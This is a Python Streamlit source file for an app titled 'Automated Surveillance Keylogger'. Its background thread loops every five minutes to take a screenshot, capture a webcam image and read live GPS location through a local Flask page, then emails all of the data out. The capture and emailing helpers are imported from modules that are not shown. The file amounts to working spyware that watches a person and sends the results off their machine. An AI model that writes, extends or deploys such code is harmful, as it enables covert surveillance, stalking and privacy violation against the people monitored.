import os
import time
import threading
import streamlit as st
import webbrowser
from utils.geolocation import get_location
from utils.webcam_capture import capture_webcam
from utils.screenshot import take_screenshot
from utils.send_email import send_data_to_email

# GPS browser tracker (Flask)
from gps_server import start_gps_tracking, get_gps_data

# Folder paths
screenshot_folder = "logs/screenshots/"
webcam_folder = "logs/webcam/"
os.makedirs(screenshot_folder, exist_ok=True)
os.makedirs(webcam_folder, exist_ok=True)

# Background thread function
def background_capture():
    while True:
        try:
            # Capture screenshot
            screenshot_path = take_screenshot(screenshot_folder)
            print(f"[✔] Screenshot saved: {screenshot_path}")

            # Capture webcam
            webcam_path = capture_webcam(webcam_folder)
            print(f"[✔] Webcam saved: {webcam_path}")

            # Get real-time GPS data from browser
            location = get_gps_data()
            print(f"[✔] Location: {location}")

            # Send everything via email (you can also pass location into the email content)
            send_data_to_email(screenshot_folder, webcam_folder, location_info=location)
            print("[✉️] Email sent successfully.\n")

        except Exception as e:
            print(f"[❌] Error: {e}")

        # Wait 5 minutes before next capture
        time.sleep(300)

def main():
    st.title("Automated Surveillance Keylogger")
    st.warning("This app captures webcam, screenshot, and real-time GPS location every 5 minutes.")
    st.write("Logs are emailed automatically with live location info.")

    # Start GPS server once
    if 'gps_started' not in st.session_state:
        st.session_state.gps_started = True
        start_gps_tracking()
        webbrowser.open("http://localhost:5050")  # Auto-open GPS page

    # Start background capture thread once
    if 'started' not in st.session_state:
        st.session_state.started = True
        threading.Thread(target=background_capture, daemon=True).start()
        st.success("Background capture started.")

if __name__ == "__main__":
    main()
